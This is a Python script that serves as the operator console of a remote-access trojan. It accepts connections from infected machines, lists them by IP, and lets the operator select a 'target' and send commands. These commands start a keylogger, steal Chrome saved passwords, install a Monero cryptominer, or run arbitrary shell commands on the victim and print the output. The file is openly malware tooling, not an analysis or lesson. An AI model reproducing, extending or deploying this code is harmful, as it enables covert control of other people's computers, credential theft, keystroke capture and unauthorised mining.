import socket
import threading

HOST = '127.0.0.1'
PORT = 1234

def help1():
    print()
    print('keylogger_start - cmd to start keylogger')
    print('chrome_pass - cmd to get chrome saved password')
    print('cryptojack_monero - cmd to install xmr and start mining')
    print('back - cmd to go back to the gui')
    print('exit - cmd to close the connection')
    print()
    
def cmd_client(client_socket):
    try:
        while True:
            cmd = input('Enter cmd to execute: ')
            if cmd.lower() == 'back':
                return
            elif cmd.lower() == 'exit':
                client_socket.close()
            elif cmd.lower() == 'help':
                help1()
            elif cmd.lower() == 'keylogger_start':
                client_socket.send(cmd.encode())
            elif cmd.lower() == 'chrome_pass':
                client_socket.send(cmd.encode())
            elif cmd.lower() == 'cryptojack_monero':
                client_socket.send(cmd.encode())
            else:
                client_socket.send(cmd.encode())
                data_rec = client_socket.recv(1024).decode()
                print(data_rec)
    except ConnectionResetError:
        print('Connection disconnected unexpectedly')
    finally:
        print('Connection closed')

def create_and_listen_socket():
    server_socket = socket.socket()
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print()
    client_socket, addr = server_socket.accept()
    users[addr[0]] = client_socket  # Store IP address as the key it will come with port only ip address

def list_users():
    if not users:
        print("No users found.")
    else:
        for user in users:
            print(user)
        print()

users = {}
threading.Thread(target=create_and_listen_socket).start()

def help():
    print()
    print('list - cmd to list the users')
    print('select - cmd to select specific target')
    print()
    
    
def outer_gui():
    while True:
        cmd = input('To specify the cmd: ')
        print()
        if cmd.lower() == 'list':
            list_users()
        elif cmd.lower() == 'help':
            help()
        elif cmd.lower() == 'select':
            ip_address = input(str('Enter the IP address to access: ')).strip()
            if ip_address in users:
                select_socket = users[ip_address]
                cmd_client(select_socket)
            else:
                print('Invalid IP address')

outer_gui()
